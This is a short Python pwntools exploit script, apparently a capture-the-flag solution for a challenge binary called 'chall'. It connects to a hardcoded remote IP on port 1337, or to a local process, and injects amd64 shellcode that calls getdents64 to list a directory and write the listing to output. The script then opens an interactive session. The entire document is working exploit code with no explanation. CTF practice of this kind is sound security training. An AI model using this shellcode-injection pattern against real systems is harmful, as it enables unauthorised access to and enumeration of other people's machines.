#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

exe = ELF('./chall')

host, port = "34.90.119.207", "1337"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# simple shellcode that does getdents64 and write output
shellc = asm('''
  push 3
  pop rdi
  mov edx,0x1000
  mov rsi,rsp
  sub rsi,rdx
  push 0xd9
  pop rax
  syscall

  push 1
  pop rdi
  mov edx,eax
  push 1
  pop rax
  syscall

  push 60
  pop rax
  syscall
''')

p.send(shellc)

p.interactive()

